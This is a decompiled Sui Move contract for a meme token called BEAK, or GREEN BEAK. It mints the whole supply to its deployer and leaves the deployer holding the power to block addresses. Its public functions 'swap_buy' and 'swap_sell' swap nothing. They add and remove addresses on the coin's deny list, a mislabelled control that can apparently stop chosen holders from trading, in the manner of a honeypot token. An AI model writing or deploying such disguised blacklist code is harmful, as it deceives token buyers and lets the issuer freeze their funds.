module 0x96cf2665294eb28d97634b849ab883a0858b10505ad7ef767aecca0e0657816f::beak {
    struct BEAK has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BEAK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BEAK>(arg0, 9, b"BEAK", b"GREEN BEAK", x"4c616e64776f6c66e280997320756c74696d61746520706172746e657220696e206368616f73212046726f6d20736f63636572207374617220746f205665676173206c6567656e642c20477265656e6265616b206c69766573206c696665206661737420616e64206c6f6f73652077697468206e6f20726567726574732e2057696c64206e69676874732c206269672077696e732c20616e64206d617968656d2067756172616e746565642e", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmeTEs7CKS4pihmDfZL136tLhFDJJvgULSo5QNxseX3ukt"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BEAK>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BEAK>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BEAK>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BEAK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BEAK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BEAK>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BEAK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BEAK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

